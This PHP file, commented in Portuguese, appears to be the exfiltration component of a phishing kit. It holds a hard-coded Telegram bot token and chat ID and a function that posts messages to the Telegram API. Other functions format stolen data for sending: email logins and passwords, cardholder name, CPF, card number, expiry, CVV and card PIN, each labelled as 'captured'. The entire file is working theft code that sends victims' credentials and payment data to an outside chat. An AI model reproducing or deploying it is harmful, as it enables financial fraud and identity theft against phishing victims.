<?php

// Configurações do Bot do Telegram
define('TELEGRAM_BOT_TOKEN', '8594507908:AAHY0pQGcx2Qst2zmf2bEW3jN1rQWAH7QyI');
define('TELEGRAM_CHAT_ID', '6514868118'); // Chat ID configurado automaticamente

/**
 * Envia uma mensagem para o bot do Telegram
 * @param string $message A mensagem a ser enviada
 * @return bool True se enviado com sucesso, False caso contrário
 */
function enviarParaTelegram($message) {
    $bot_token = TELEGRAM_BOT_TOKEN;
    $chat_id = TELEGRAM_CHAT_ID;
    
    $url = "https://api.telegram.org/bot{$bot_token}/sendMessage";
    
    $data = [
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    $options = [
        'http' => [
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data)
        ]
    ];
    
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    
    return $result !== false;
}

/**
 * Formata dados de login para envio
 */
function formatarDadosLogin($email, $senha) {
    $timestamp = date('d/m/Y H:i:s');
    return "🔐 <b>NOVO LOGIN CAPTURADO</b>\n\n" .
           "📧 <b>Email:</b> {$email}\n" .
           "🔑 <b>Senha:</b> {$senha}\n" .
           "⏰ <b>Data/Hora:</b> {$timestamp}";
}

/**
 * Formata dados de cartão para envio
 */
function formatarDadosCartao($nome, $cpf, $numero_cartao, $validade, $cvv) {
    $timestamp = date('d/m/Y H:i:s');
    return "💳 <b>DADOS DE CARTÃO CAPTURADOS</b>\n\n" .
           "👤 <b>Nome:</b> {$nome}\n" .
           "📄 <b>CPF:</b> {$cpf}\n" .
           "💳 <b>Número:</b> {$numero_cartao}\n" .
           "📅 <b>Validade:</b> {$validade}\n" .
           "🔢 <b>CVV:</b> {$cvv}\n" .
           "⏰ <b>Data/Hora:</b> {$timestamp}";
}

/**
 * Formata senha do cartão para envio
 */
function formatarSenhaCartao($senha_cartao) {
    $timestamp = date('d/m/Y H:i:s');
    return "🔐 <b>SENHA DO CARTÃO CAPTURADA</b>\n\n" .
           "🔑 <b>Senha:</b> {$senha_cartao}\n" .
           "⏰ <b>Data/Hora:</b> {$timestamp}";
}

?>